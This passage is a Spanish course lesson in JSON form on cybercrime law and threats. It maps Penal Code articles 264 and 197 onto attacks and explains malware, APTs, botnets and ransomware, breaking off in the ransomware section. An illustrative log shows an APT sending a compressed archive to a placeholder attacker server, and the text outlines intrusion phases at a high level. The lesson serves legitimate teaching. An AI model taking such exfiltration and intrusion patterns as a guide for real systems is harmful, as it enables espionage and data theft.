@@ -1,0 +1,1474 @@
+{
+  "course": "ciberdelitos",
+  "number": 9,
+  "title": "Tipos delictivos III",
+  "minutes": 55,
+  "intro": {
+    "why": "En mayo de 2017 el ransomware WannaCry cifró ordenadores de Telefónica en España y de los hospitales públicos británicos en pocas horas: era un daño informático en estado puro. Ese mismo año, miles de menores sufrían acoso por redes sociales y grupos terroristas reclutaban seguidores con vídeos en Internet. Este tema recorre esos delitos: los que atacan a los propios sistemas (daños, intrusiones, malware, APT, botnets, ransomware) y los que usan la red como altavoz (abusos a menores, terrorismo, acoso, grooming, injurias y suplantación de identidad). Saber qué artículo del Código Penal encaja en cada caso es lo que distingue a un profesional de la ciberseguridad de un simple técnico.",
+    "before": [
+      "El **Código Penal** es la ley que dice qué conductas son delito y qué pena tienen. El español vigente es la **Ley Orgánica 10/1995**, reformada muchas veces; para los ciberdelitos la reforma clave es la **Ley Orgánica 1/2015**.",
+      "Una **ley orgánica** es una ley que necesita mayoría absoluta del Congreso porque regula materias especialmente sensibles, como los derechos fundamentales o las penas de prisión. Por eso el Código Penal y sus reformas son leyes orgánicas.",
+      "Un **malware** (de malicious software, software malicioso) es cualquier programa hecho para entrar o dañar un sistema sin permiso de su dueño: virus, troyanos, ransomware, etc.",
+      "La seguridad de la información se apoya en tres pilares, la llamada **tríada CIA**: confidencialidad (que solo lo lea quien debe), integridad (que nadie lo altere) y disponibilidad (que funcione cuando lo necesitas)."
+    ],
+    "goals": [
+      "Al terminar sabrás explicar qué son los daños informáticos y qué pilar de la seguridad ataca cada conducta.",
+      "Sabrás distinguir los artículos 264, 264 bis y 264 ter (daños a datos, a sistemas y herramientas para dañar) del artículo 197 y el 197 bis (secretos, intimidad y acceso ilícito).",
+      "Sabrás describir el malware moderno: polimórfico, móvil, persistente y orientado al lucro.",
+      "Sabrás explicar qué es una APT, sus características y las siete fases de Mandiant.",
+      "Sabrás cómo se monta y para qué se usa una botnet, y cómo funciona el negocio del ransomware y el cryptojacking.",
+      "Sabrás reconocer cómo se difunden en la red los contenidos de abusos a menores y la propaganda terrorista.",
+      "Sabrás diferenciar ciberacoso, ciberbullying, ciberbaiting y grooming, y conocer las fases del grooming.",
+      "Sabrás distinguir injuria, calumnia y usurpación de identidad en redes sociales."
+    ]
+  },
+  "sections": [
+    {
+      "id": "danos-y-triada",
+      "title": "Daños informáticos: los delitos más «puramente informáticos»",
+      "pages": [
+        5,
+        6
+      ],
+      "blocks": [
+        {
+          "type": "analogy",
+          "text": "Piensa en tu diario personal guardado en un cajón. Alguien puede **leerlo** sin permiso (ataca su confidencialidad), puede **arrancar o reescribir páginas** (ataca su integridad) o puede **cerrar el cajón con un candado** para que tú no lo abras (ataca su disponibilidad). Los daños informáticos son exactamente eso, pero con ficheros y servidores."
+        },
+        {
+          "type": "p",
+          "text": "De todos los ciberdelitos de la asignatura, los de este bloque son los **más puramente informáticos**: no son un delito clásico hecho con ordenador (como una estafa por correo), sino ataques directos contra la información y los sistemas. El temario los describe como ataques contra los principios de **confidencialidad, integridad y disponibilidad**."
+        },
+        {
+          "type": "table",
+          "title": "La tríada CIA aplicada a los ataques del tema",
+          "head": [
+            "Principio",
+            "Qué protege",
+            "Ejemplo de ataque"
+          ],
+          "rows": [
+            [
+              "Confidencialidad",
+              "Que solo accedan los autorizados",
+              "Entrar sin permiso en los ficheros de un sistema; espiar correos"
+            ],
+            [
+              "Integridad",
+              "Que los datos no se alteren sin permiso",
+              "Borrar, modificar o corromper ficheros; malware que destruye datos"
+            ],
+            [
+              "Disponibilidad",
+              "Que el sistema funcione cuando se necesita",
+              "Dejar fuera de servicio un sistema con una denegación de servicio (DoS)"
+            ]
+          ]
+        },
+        {
+          "type": "term",
+          "term": "DoS y DDoS",
+          "text": "DoS (Denial of Service, denegación de servicio): ataque que satura o bloquea un sistema para que los usuarios legítimos no puedan usarlo. Si el ataque llega desde muchos equipos a la vez, se llama DDoS (Distributed DoS, denegación de servicio distribuida)."
+        },
+        {
+          "type": "list",
+          "title": "Conductas que se agrupan bajo «daños informáticos»",
+          "items": [
+            "Accesos ilícitos a sistemas o a partes de ellos.",
+            "Interceptación ilícita de comunicaciones de datos.",
+            "Ataques contra la integridad de los datos: dañar, deteriorar, alterar, suprimir o hacer inaccesibles datos o programas ajenos (por ejemplo, con malware).",
+            "Ataques contra la integridad de los sistemas: obstaculizar o interrumpir el funcionamiento de un sistema ajeno (por ejemplo, con DoS).",
+            "Abuso de dispositivos: crear o vender herramientas para cometer esos ataques."
+          ]
+        },
+        {
+          "type": "term",
+          "term": "Decisión marco 2005/222/JAI",
+          "text": "Una decisión marco era un instrumento de la Unión Europea (anterior al Tratado de Lisboa) que obligaba a los Estados a alcanzar un resultado, dejándoles elegir cómo. Se parece a lo que hoy es una **directiva europea**: no se aplica directamente, sino que cada país la incorpora a su ley. Esta, de 24 de febrero de 2005, trataba los ataques contra los sistemas de información y obligó a España a homogeneizar su Código Penal. JAI significa Justicia y Asuntos de Interior."
+        },
+        {
+          "type": "p",
+          "text": "Esa decisión marco define **dato** como toda representación de hechos, informaciones o conceptos que un sistema puede tratar, **incluidos los programas**. Es decir: un programa también es un dato, y destruirlo también es daño informático."
+        },
+        {
+          "type": "exam",
+          "text": "Si el test pregunta contra qué principio atentan los daños informáticos y solo una opción es un pilar real de la tríada, elige ese: **integridad** (o confidencialidad, o disponibilidad). Trampas: «indisponibilidad» (suena parecido pero no es un principio, es el efecto del ataque), «lealtad», «funcionalidad», «productividad» o «correo electrónico». Y si pregunta por «dejar fuera de servicio un sistema», la respuesta es **disponibilidad**, no confidencialidad."
+        },
+        {
+          "type": "key",
+          "text": "Daños informáticos = ataques contra confidencialidad, integridad y disponibilidad. Borrar o alterar datos ataca la integridad; tumbar un servicio ataca la disponibilidad."
+        }
+      ]
+    },
+    {
+      "id": "articulos-264",
+      "title": "Artículos 264, 264 bis y 264 ter: dañar datos, tumbar sistemas y vender herramientas",
+      "pages": [
+        5,
+        7
+      ],
+      "blocks": [
+        {
+          "type": "p",
+          "text": "El Código Penal separa los daños informáticos según **sobre qué recae** la conducta: la información en sí (datos, documentos, programas) o el sistema que la hace funcionar. Y añade un tercer artículo para quien ayuda fabricando o vendiendo herramientas."
+        },
+        {
+          "type": "analogy",
+          "text": "Imagina una biblioteca. Romper o tachar libros es el artículo 264 (daño a la información). Bloquear la puerta o cortar la luz para que nadie pueda entrar es el 264 bis (daño al sistema). Vender ganzúas y llaves copiadas para que otro entre es el 264 ter."
+        },
+        {
+          "type": "table",
+          "title": "Los tres artículos de un vistazo",
+          "head": [
+            "Artículo",
+            "Qué castiga",
+            "Pena básica"
+          ],
+          "rows": [
+            [
+              "264",
+              "Borrar, dañar, deteriorar, alterar, suprimir o hacer inaccesibles datos, programas o documentos electrónicos ajenos, sin autorización, de manera grave y con resultado grave",
+              "Prisión de 6 meses a 3 años"
+            ],
+            [
+              "264 bis",
+              "Obstaculizar o interrumpir gravemente el funcionamiento de un sistema informático ajeno: con las conductas del 264, introduciendo o transmitiendo datos (típico DoS) o destruyendo o sustituyendo el sistema",
+              "Prisión de 6 meses a 3 años"
+            ],
+            [
+              "264 ter",
+              "Producir, adquirir para usar, importar o facilitar a otros programas pensados para cometer esos delitos, o contraseñas y códigos de acceso",
+              "Prisión de 6 meses a 2 años o multa de 3 a 18 meses"
+            ]
+          ]
+        },
+        {
+          "type": "list",
+          "title": "Agravantes del 264 bis que conviene recordar",
+          "items": [
+            "Si se perjudica de forma relevante la actividad normal de una **empresa, negocio o Administración pública**, la pena va a su mitad superior y puede subir de grado.",
+            "Si concurren las circunstancias graves del 264.2 (por ejemplo, organización criminal o afectar a infraestructuras críticas), prisión de 3 a 8 años y multa del triplo al décuplo del perjuicio.",
+            "Si se usan ilícitamente **datos personales de otra persona** para entrar en el sistema o ganarse la confianza de un tercero, pena en su mitad superior."
+          ]
+        },
+        {
+          "type": "term",
+          "term": "Pena en su mitad superior / pena superior en grado",
+          "text": "Si la pena va de 6 meses a 3 años, su mitad superior es de 1 año y 9 meses a 3 años. Subir un grado significa pasar a una horquilla más alta, que empieza donde acaba la anterior."
+        },
+        {
+          "type": "example",
+          "title": "Caso práctico",
+          "text": "Un exempleado resentido usa su contraseña antigua para borrar la base de datos de clientes (art. 264). Una semana después lanza un ataque que satura la web de la tienda y la deja caída dos días en plena campaña de rebajas (art. 264 bis, agravado por perjudicar a una empresa). Un foro le vendió el programa del ataque: el vendedor responde por el 264 ter."
+        },
+        {
+          "type": "p",
+          "text": "Ojo: **no todo malware es un delito de daños**. Muchas veces el virus o el troyano no busca romper nada, sino entrar y **robar información**. Eso ya no encaja en el 264, sino en el **artículo 197**, que verás en el apartado siguiente."
+        },
+        {
+          "type": "exam",
+          "text": "Fíjate en el verbo: borrar o alterar datos es 264; interrumpir el funcionamiento de un sistema es 264 bis; fabricar o pasar herramientas o contraseñas es 264 ter; espiar o robar información es 197."
+        },
+        {
+          "type": "key",
+          "text": "264 protege la información, 264 bis protege el funcionamiento del sistema y 264 ter castiga a quien suministra las herramientas para atacar."
+        }
+      ]
+    },
+    {
+      "id": "articulo-197",
+      "title": "Artículo 197 y 197 bis: secretos, intimidad y acceso ilícito",
+      "pages": [
+        7,
+        12
+      ],
+      "blocks": [
+        {
+          "type": "analogy",
+          "text": "Abrir la carta de tu vecino es delito aunque dentro solo haya una factura de la luz. Lo que se protege no es lo interesante del contenido, sino el derecho de tu vecino a que nadie fisgue en sus cosas."
+        },
+        {
+          "type": "p",
+          "text": "El **artículo 197** recoge el delito de **descubrimiento y revelación de secretos**. Es el que se aplica cuando el malware se usa para espiar o robar datos personales."
+        },
+        {
+          "type": "table",
+          "title": "Las conductas básicas",
+          "head": [
+            "Apartado",
+            "Conducta",
+            "Pena"
+          ],
+          "rows": [
+            [
+              "197.1",
+              "Para descubrir secretos o vulnerar la intimidad de otro, sin su consentimiento: apoderarse de sus papeles, cartas, **correos electrónicos** u otros documentos, o interceptar sus telecomunicaciones o usar aparatos de escucha o grabación",
+              "Prisión de 1 a 4 años y multa de 12 a 24 meses"
+            ],
+            [
+              "197.2",
+              "Apoderarse, usar, modificar o acceder sin autorización a **datos reservados personales o familiares** registrados en ficheros o soportes informáticos, en perjuicio del titular o de un tercero. Se le llama delito contra la privacidad informática o **habeas data**",
+              "Las mismas"
+            ]
+          ]
+        },
+        {
+          "type": "list",
+          "title": "Precisiones del 197.1",
+          "items": [
+            "Hay un **elemento subjetivo**: la intención de descubrir secretos o vulnerar la intimidad, y falta de consentimiento (expreso o tácito) del titular.",
+            "Basta con **acceder**: no hace falta que el contenido sea íntimo, ni divulgarlo, ni siquiera llegar a descubrir algo. El delito se consuma con el acceso y cabe la tentativa.",
+            "«Correo electrónico» se interpreta en sentido amplio: chats, WhatsApp, Messenger y cualquier medio similar futuro."
+          ]
+        },
+        {
+          "type": "table",
+          "title": "Tipos agravados",
+          "head": [
+            "Agravante",
+            "Efecto"
+          ],
+          "rows": [
+            [
+              "Difundir, revelar o ceder a terceros lo descubierto (197.3)",
+              "Prisión de 2 a 5 años. Quien difunde sabiendo el origen ilícito pero sin haber participado: 1 a 3 años"
+            ],
+            [
+              "Lo hace el **encargado o responsable** de los ficheros, o se usan datos personales de la víctima (197.4)",
+              "Prisión de 3 a 5 años; si además se ceden, mitad superior"
+            ],
+            [
+              "Datos sensibles (ideología, religión, creencias, salud, origen racial, vida sexual) o víctima menor o con discapacidad (197.5)",
+              "Mitad superior"
+            ],
+            [
+              "Ánimo de lucro (el temario lo cita como 197.5; en el Código es el 197.6)",
+              "Mitad superior; si además son datos sensibles, 4 a 7 años"
+            ]
+          ]
+        },
+        {
+          "type": "term",
+          "term": "Datos especialmente protegidos",
+          "text": "Datos cuya revelación puede causar discriminación: ideología, afiliación sindical, religión, creencias, origen racial, salud y vida sexual. El temario los vincula al artículo 7 de la antigua ley de protección de datos; hoy el equivalente es el artículo 9 del RGPD (Reglamento General de Protección de Datos de la UE). Un **reglamento europeo**, a diferencia de una directiva, se aplica directamente en todos los países sin necesidad de ley nacional."
+        },
+        {
+          "type": "p",
+          "text": "La reforma de la LO 1/2015 añadió el **artículo 197 bis**, que traslada la Decisión marco 2005/222/JAI y protege la **seguridad informática** en sí misma, aunque no se llegue a tocar ningún dato íntimo."
+        },
+        {
+          "type": "table",
+          "title": "Artículo 197 bis",
+          "head": [
+            "Apartado",
+            "Conducta",
+            "Pena"
+          ],
+          "rows": [
+            [
+              "197 bis.1",
+              "Acceder o facilitar a otro el acceso a un sistema de información **vulnerando medidas de seguridad**, sin autorización, o mantenerse dentro contra la voluntad del titular",
+              "Prisión de 6 meses a 2 años"
+            ],
+            [
+              "197 bis.2",
+              "Interceptar con artificios técnicos transmisiones **no públicas** de datos desde, hacia o dentro de un sistema, incluidas sus emisiones electromagnéticas",
+              "Prisión de 3 meses a 2 años o multa de 3 a 12 meses"
+            ]
+          ]
+        },
+        {
+          "type": "example",
+          "title": "Caso práctico",
+          "text": "Una persona instala un troyano en el portátil de su pareja y lee sus conversaciones de WhatsApp: 197.1 (aunque las conversaciones sean triviales). Si después las publica en Instagram: 197.3. Un técnico de un hospital que consulta historias clínicas de famosos sin necesidad: 197.2 con agravante por ser encargado del fichero y por tratarse de datos de salud. Un atacante que salta el cortafuegos de una empresa y se queda dentro sin tocar nada: 197 bis.1."
+        },
+        {
+          "type": "exam",
+          "text": "Trampa típica: pensar que el 197.1 exige que el contenido leído sea íntimo o que se difunda. No: basta el acceso con intención de vulnerar la intimidad. La difusión es una agravante (197.3), no un requisito."
+        },
+        {
+          "type": "key",
+          "text": "Robar o espiar información es 197 (intimidad); entrar en un sistema saltándose la seguridad o interceptar transmisiones no públicas es 197 bis; destruir es 264."
+        }
+      ]
+    },
+    {
+      "id": "malware",
+      "title": "El malware moderno: silencioso, polimórfico y también en el móvil",
+      "pages": [
+        12,
+        16
+      ],
+      "blocks": [
+        {
+          "type": "p",
+          "text": "El temario define el **malware** como el software diseñado para acceder a un sistema y manipularlo **sin el conocimiento ni la autorización** de su dueño. Lo más importante es entender cómo ha cambiado su objetivo con el tiempo."
+        },
+        {
+          "type": "table",
+          "title": "Del vandalismo al negocio",
+          "head": [
+            "Antes",
+            "Ahora"
+          ],
+          "rows": [
+            [
+              "Melissa (1999) y LoveLetter (2000): daños visibles e inmediatos, para presumir",
+              "Pasar desapercibido y permanecer activo el mayor tiempo posible"
+            ],
+            [
+              "El usuario sabía que estaba infectado",
+              "Roba información o usa los recursos del equipo en beneficio del delincuente"
+            ],
+            [
+              "Ejemplar único, fácil de detectar",
+              "Variantes casi infinitas gracias al polimorfismo"
+            ]
+          ]
+        },
+        {
+          "type": "term",
+          "term": "Cryptojacking",
+          "text": "Usar a escondidas el procesador de la víctima para minar criptomonedas (calcular operaciones que generan monedas digitales) en beneficio del atacante. La víctima solo nota el equipo lento o caliente."
+        },
+        {
+          "type": "term",
+          "term": "Ingeniería social",
+          "text": "Engañar a las personas, en vez de a las máquinas, para que hagan algo que favorece al atacante: abrir un adjunto, dar una contraseña, instalar una aplicación. Junto con las vulnerabilidades y las malas configuraciones, es la principal vía de distribución del malware."
+        },
+        {
+          "type": "analogy",
+          "text": "Un antivirus clásico funciona como un portero con un álbum de fotos de delincuentes fichados (las **firmas**). El malware **polimórfico** es un delincuente que se cambia la cara, el pelo y la ropa cada vez que entra en un sitio: el portero nunca lo reconoce porque ninguna foto coincide."
+        },
+        {
+          "type": "term",
+          "term": "Malware polimórfico",
+          "text": "Malware capaz de **cambiar dinámicamente su propia estructura** para no ser detectado por los antimalware basados en firmas. El temario lo señala como **el verdadero salto cualitativo** en la creación de malware: puede existir una variante distinta para cada equipo infectado, de modo que es imposible contar cuántas variantes hay."
+        },
+        {
+          "type": "term",
+          "term": "Firma (de malware)",
+          "text": "Huella característica (un fragmento de código, un resumen matemático del fichero) que identifica una muestra concreta de malware. Si el código cambia, la firma antigua deja de servir."
+        },
+        {
+          "type": "list",
+          "title": "Qué busca el malware para móviles (smartphones y tabletas)",
+          "items": [
+            "Enviar SMS (Short Message Service, mensajes cortos) a **servicios de tarificación adicional**: números de pago cuyo cobro acaba, en parte, en manos del atacante.",
+            "Capturar la información que el móvil envía a la banca electrónica y otros sistemas de pago.",
+            "Secuestrar funciones del dispositivo y extorsionar al dueño, como el ransomware de los ordenadores.",
+            "Robar información particular (contactos, fotos) y credenciales de correo y redes sociales configuradas en el teléfono.",
+            "Controlar el móvil en remoto como parte de una **botnet móvil**."
+          ]
+        },
+        {
+          "type": "p",
+          "text": "Las vías de infección del móvil son las mismas que en el PC: correos electrónicos, webs comprometidas, tiendas de aplicaciones (incluso oficiales) y falsas campañas de marketing."
+        },
+        {
+          "type": "example",
+          "title": "Caso práctico",
+          "text": "Un usuario descarga una linterna gratuita. A fin de mes, su factura incluye 40 euros en mensajes a un número de pago que nunca envió. La aplicación mandaba SMS premium en segundo plano. Además de revisar los archivos del teléfono, hay que estudiar el **abuso de las funciones de comunicación** que generan ingresos al atacante."
+        },
+        {
+          "type": "exam",
+          "text": "Pregunta clásica: «¿cuál NO es un objetivo del malware móvil?». La opción trampa cambia «números de tarificación adicional» por «números de teléfono privados». Mandar SMS a un particular no da dinero a nadie; lo que da dinero es el número de pago. Y si te preguntan por el salto cualitativo del malware, es el **polimorfismo**, no los troyanos, la ingeniería social ni el malware para smartphones."
+        },
+        {
+          "type": "key",
+          "text": "El malware actual busca lucro y discreción; el polimorfismo, que cambia el código para burlar las firmas, fue su gran salto cualitativo. En el móvil busca SMS de pago, datos bancarios, credenciales y formar botnets."
+        }
+      ]
+    },
+    {
+      "id": "apt",
+      "title": "APT: el ladrón que se muda a tu casa",
+      "pages": [
+        16,
+        20
+      ],
+      "blocks": [
+        {
+          "type": "analogy",
+          "text": "Un ladrón corriente entra, coge lo que puede y huye. Una APT es un espía que estudia tu casa durante meses, entra por la ventana del vecino, se hace una copia de todas tus llaves, se esconde en el desván y se queda a vivir allí durante años, leyendo cada carta nueva que llega. Si descubres una de sus llaves y cambias esa cerradura, tiene otras diez."
+        },
+        {
+          "type": "term",
+          "term": "APT (Advanced Persistent Threat, amenaza persistente avanzada)",
+          "text": "Conjunto de medios y técnicas de un ciberataque sofisticado cuyo objetivo es **infiltrarse** en una red y **permanecer** en ella mucho tiempo, extrayendo constantemente información sensible o crítica de la víctima. Su finalidad típica es el **ciberespionaje**: robar información industrial, de investigación o estratégica."
+        },
+        {
+          "type": "table",
+          "title": "Las tres palabras de la sigla",
+          "head": [
+            "Rasgo",
+            "Qué significa"
+          ],
+          "rows": [
+            [
+              "Dirigida (threat)",
+              "La víctima no es casual: se elige por la información concreta que tiene y el ataque se diseña a medida."
+            ],
+            [
+              "Avanzada",
+              "Ataque complejo, con malware exclusivo, exploits de vulnerabilidades no publicadas, ingeniería social e interceptación de comunicaciones. Los autores tienen **amplísimos recursos** técnicos, humanos y económicos, y no tienen prisa."
+            ],
+            [
+              "Persistente",
+              "Si un intento falla, buscan otra vía. Una vez dentro, se quedan muchísimo tiempo y **mutan constantemente** para adaptarse y no ser detectados."
+            ]
+          ]
+        },
+        {
+          "type": "term",
+          "term": "Exploit",
+          "text": "Programa o fragmento de código que aprovecha una vulnerabilidad (un fallo) de un software para hacer algo que no debería permitir, como ejecutar código del atacante."
+        },
+        {
+          "type": "p",
+          "text": "Al principio se creía que las APT solo amenazaban a infraestructuras críticas; hoy se acepta que pueden afectar a **cualquier organización**, sea cual sea su tamaño. La empresa Mandiant describió **siete fases**, que no son una lista que se recorre una vez, sino un **ciclo** que se repite."
+        },
+        {
+          "type": "steps",
+          "title": "Las siete fases de Mandiant",
+          "items": [
+            "**Reconocimiento**: recopilar información pública y confidencial de la víctima (web, prensa, directivos, proveedores, redes sociales) para elegir a las personas objetivo, normalmente directivos o investigadores, y la mejor vía de entrada.",
+            "**Intrusión inicial**: sobre todo por **spear phishing**, correos dirigidos a esas personas concretas con enlaces o adjuntos que contienen malware o exploits.",
+            "**Establecer un backdoor** (puerta trasera): conseguir credenciales de administrador del dominio, instalar varias puertas traseras y conectar con el servidor de **mando y control (C&C)**, con tráfico cifrado y ofuscado.",
+            "**Obtención de credenciales de usuario**: primero las de los equipos individuales, después las de los controladores de dominio y administradores, para moverse con identidades legítimas.",
+            "**Explorar e instalar utilidades**: sniffers, descifradores o registradores de teclas para controlar los equipos. Se instalan **con credenciales válidas**, así que parecen acciones de un usuario legítimo.",
+            "**Escalada de privilegios, movimiento lateral y extracción de datos**: colonizar el resto de equipos, alcanzar los servidores más importantes y enviar la información, comprimida y cifrada, a servidores de los atacantes.",
+            "**Mantener la persistencia**: mutar el malware, abrir nuevos accesos remotos e infectar más equipos para no ser detectados por antivirus ni por sistemas de detección de intrusiones."
+          ]
+        },
+        {
+          "type": "term",
+          "term": "Spear phishing",
+          "text": "Phishing (engaño por correo para que la víctima haga clic o entregue datos) dirigido a una persona concreta, con un mensaje preparado a medida gracias al reconocimiento. Como un arpón (spear) frente a una red de pesca."
+        },
+        {
+          "type": "term",
+          "term": "C&C (Command and Control, mando y control)",
+          "text": "Servidor desde el que los atacantes dan órdenes al malware y reciben sus avisos. Cuando el implante se instala, «llama a casa» para decir que está operativo."
+        },
+        {
+          "type": "term",
+          "term": "Escalada de privilegios y movimiento lateral",
+          "text": "Escalar privilegios es pasar de una cuenta con pocos permisos a otra con muchos (por ejemplo, administrador). Moverse lateralmente es saltar de un equipo comprometido a otros de la misma red."
+        },
+        {
+          "type": "code",
+          "title": "Así podría verse en un registro (ejemplo ilustrativo)",
+          "text": "08:02  PC-DIRECCION   apertura de adjunto «Presupuesto_2025.docm»\n08:03  PC-DIRECCION   conexión HTTPS saliente a cdn-update.example.net (C&C)\n10:47  SRV-FICHEROS   inicio de sesión: DOMINIO\\admin.sistemas  (cuenta válida)\n10:49  SRV-FICHEROS   instalación de servicio «RemoteHelper»\n02:15  SRV-PROYECTOS  creación de proyectos.7z (3,2 GB)\n02:21  SRV-PROYECTOS  envío de proyectos.7z a 203.0.113.45"
+        },
+        {
+          "type": "example",
+          "title": "Cómo leer ese registro",
+          "text": "El adjunto es la intrusión inicial; la conexión saliente, el aviso al C&C. Que la herramienta remota se instalara con la cuenta real de un administrador **no prueba** que ese administrador lo autorizara: el atacante le robó la credencial. El salto a otros servidores y el envío de un archivo comprimido son movimiento lateral y extracción de datos. Fíjate en que nada se borró y el servicio no se cayó: en una APT el objetivo es **robar en silencio** (confidencialidad), no destruir (integridad) ni tumbar (disponibilidad)."
+        },
+        {
+          "type": "exam",
+          "text": "Las trampas más frecuentes: «una vez instalada la APT, el malware no se modifica para no ser detectado» (falso: muta constantemente justamente para no ser detectado) y «desinstalación del software de comunicaciones» como fase (no existe; al contrario, la comunicación con el C&C se mantiene). Si se elimina la infección inicial, no se ha erradicado la APT: hay otras puertas traseras y credenciales robadas. Y una revisión basada solo en firmas antiguas falla porque el código cambia."
+        },
+        {
+          "type": "key",
+          "text": "Una APT es dirigida, avanzada y persistente: entra por spear phishing, roba credenciales legítimas, se mueve lateralmente, extrae datos en silencio y muta para quedarse. Sus siete fases forman un ciclo."
+        }
+      ]
+    },
+    {
+      "id": "botnet",
+      "title": "Botnets: ejércitos de ordenadores zombis",
+      "pages": [
+        20,
+        23
+      ],
+      "blocks": [
+        {
+          "type": "analogy",
+          "text": "Imagina a un titiritero que, sin que los dueños lo sepan, ata hilos a millones de marionetas repartidas por el mundo. Cuando tira de los hilos, todas se mueven a la vez: llaman a la misma puerta, reparten los mismos folletos o vigilan a sus dueños. Las marionetas son los equipos infectados; el titiritero, el botmaster."
+        },
+        {
+          "type": "term",
+          "term": "Botnet",
+          "text": "Red de ordenadores infectados por malware y **controlados de manera coordinada y remota** por una persona, el **botmaster**. Cada equipo de la red se llama **bot, robot o zombi**. Sus dueños no participan ni se enteran. Se han desarticulado botnets de millones de equipos."
+        },
+        {
+          "type": "steps",
+          "title": "Cómo se monta una botnet",
+          "items": [
+            "**Diseño**: qué red se quiere, para qué y con qué sistema de **mando y control (C&C)**, una interfaz sencilla que permite registrar pulsaciones de teclado (keylogger), crear cuentas de administrador, ejecutar comandos, capturar pantalla o transferir ficheros.",
+            "**Elección del malware**: programado por el propio delincuente o comprado en el mercado del cibercrimen, que incluso ofrece servicio posventa (configuración, elección de objetivos, ayuda para convertir los datos en dinero).",
+            "**Distribución**: adjuntos (PDF, Word, Excel) en correos de spam o de ingeniería social, mensajes en redes sociales, o código en webs y vídeos que infecta con solo visitarlos. El malware suele **propagarse solo** por la red buscando nuevos huéspedes."
+          ]
+        },
+        {
+          "type": "table",
+          "title": "Cómo hablan los zombis con su amo",
+          "head": [
+            "Canal",
+            "Comentario"
+          ],
+          "rows": [
+            [
+              "Puerta trasera (backdoor)",
+              "El controlador entra directamente al equipo infectado."
+            ],
+            [
+              "Conexiones web HTTP",
+              "La más usada hoy: se confunde con navegación normal, pasa los cortafuegos y se cifra fácilmente."
+            ],
+            [
+              "Redes sociales (por ejemplo, Twitter)",
+              "Las órdenes se publican como tuits. Un servicio corriente y legítimo se usa como canal de mando."
+            ]
+          ]
+        },
+        {
+          "type": "list",
+          "title": "Para qué se usa una botnet",
+          "items": [
+            "Envío masivo de spam o campañas de phishing.",
+            "Ataques de denegación de servicio distribuidos (DDoS).",
+            "Distribución de nuevo malware.",
+            "Robo de información de los usuarios infectados.",
+            "Repositorio de material ilícito (imágenes, malware, contenido que vulnera la propiedad intelectual).",
+            "Alojamiento de webs de phishing u otros fraudes.",
+            "Visitas automáticas a webs para cobrar por publicidad.",
+            "Alquiler a terceros, que pagan según el tiempo o la capacidad usada."
+          ]
+        },
+        {
+          "type": "p",
+          "text": "Un mismo zombi puede hacer **varias de estas cosas**, cambiando según la orden que reciba: hoy envía spam, mañana aloja una web falsa. Y las botnets no son solo de ordenadores: también hay malware para convertir smartphones en bots."
+        },
+        {
+          "type": "example",
+          "title": "Caso práctico",
+          "text": "La web de un ayuntamiento cae bajo millones de peticiones llegadas de routers y ordenadores domésticos de medio mundo. Sus dueños no han hecho nada a sabiendas: sus equipos son zombis de una botnet alquilada. Para la investigación, hay que distinguir el **dispositivo utilizado** del **operador** que lo dirige. Y el ayuntamiento atacado no controla ninguna de esas máquinas."
+        },
+        {
+          "type": "exam",
+          "text": "Si preguntan cómo se llama una red de equipos infectados controlados de forma coordinada y remota, es **botnet** (no «red de malware», «de troyanos» ni «de phishing»). Si plantean que un zombi envía spam y aloja phishing a la vez, la idea es que puede cumplir **varias funciones**. Y si las órdenes llegan por una red social, recuerda que un servicio conocido **no** convierte en legítima la comunicación."
+        },
+        {
+          "type": "key",
+          "text": "Una botnet es una red de zombis controlada por un botmaster mediante un C&C (hoy sobre todo por HTTP); sirve para spam, DDoS, robo de datos, alojar fraudes o alquilarse."
+        }
+      ]
+    },
+    {
+      "id": "ransomware",
+      "title": "Ransomware y cryptojacking: el secuestro digital",
+      "pages": [
+        24,
+        30
+      ],
+      "blocks": [
+        {
+          "type": "analogy",
+          "text": "Llegas a casa y alguien ha cambiado la cerradura de tu despacho. En la puerta hay una nota: «Si quieres la llave nueva, paga 500 euros a esta cuenta anónima. No avises a la policía». Eso es el ransomware: no se lleva tus cosas, te deja sin acceso a ellas y te cobra por devolvértelo."
+        },
+        {
+          "type": "term",
+          "term": "Ransomware (virus de secuestro)",
+          "text": "Del inglés ransom, rescate. Malware que **bloquea el acceso** al sistema o **cifra archivos** y exige un pago para devolver el control. Por eso se le llama también **virus de secuestro**. Los primeros casos aparecieron en Rusia en 2005-2006."
+        },
+        {
+          "type": "term",
+          "term": "Exploit kit",
+          "text": "Paquete de programas listo para usar que lanza ataques de forma automatizada. Se vende en los mercados del cibercrimen, de modo que cualquiera, sin saber programar, puede atacar."
+        },
+        {
+          "type": "list",
+          "title": "Por qué el ransomware no deja de crecer",
+          "items": [
+            "Es **sencillo** de cometer.",
+            "Aparecen **exploit kits** que lo ponen al alcance de cualquiera.",
+            "**No hay intermediarios** (como las mulas del phishing): más agilidad y menos riesgo para el delincuente.",
+            "El **pago directo y anónimo** del rescate dificulta rastrear al autor.",
+            "Muchas víctimas **no denuncian**, así que su incidencia real se desconoce."
+          ]
+        },
+        {
+          "type": "table",
+          "title": "Evolución del ransomware",
+          "head": [
+            "Etapa",
+            "Cómo actuaba"
+          ],
+          "rows": [
+            [
+              "Primeras versiones",
+              "Cifraba documentos de Office (.doc, .xls, .ppt), ponía un aviso en el fondo de escritorio y un fichero de texto con instrucciones, y amenazaba si se contaba a alguien."
+            ],
+            [
+              "Variantes de pantalla",
+              "Ventana emergente con una imagen pornográfica que solo se quitaba enviando un SMS de pago."
+            ],
+            [
+              "Falsa autoridad",
+              "Mensajes con logotipos del FBI, INTERPOL o la policía para parecer legítimos (el popular «virus de la policía» era una de estas variantes)."
+            ],
+            [
+              "WannaCry (2017)",
+              "Ataque mundial que afectó a Telefónica, Iberdrola, Gas Natural y al servicio de salud británico (unos 141 000 equipos). Usó **EternalBlue**, una vulnerabilidad de Windows desarrollada por la NSA (agencia de seguridad nacional de EE. UU.) y filtrada por The Shadow Brokers, contra equipos sin actualizar."
+            ]
+          ]
+        },
+        {
+          "type": "table",
+          "title": "Cómo se cobra el rescate",
+          "head": [
+            "Antes",
+            "Hoy"
+          ],
+          "rows": [
+            [
+              "Vales prepago de Ukash o Paysafecard: la víctima compraba un código y lo introducía en la web del delincuente, sin datos bancarios.",
+              "**Criptomonedas**: el delincuente envía la dirección de su monedero (wallet), a menudo en un código QR con la cantidad; la víctima paga desde su wallet y nada vincula el monedero con una persona."
+            ]
+          ]
+        },
+        {
+          "type": "p",
+          "text": "La clave del éxito es huir de transferencias bancarias y mulas, y usar **sistemas de pago directo** que garantizan al máximo el anonimato de quienes intervienen, lo que favorece la impunidad."
+        },
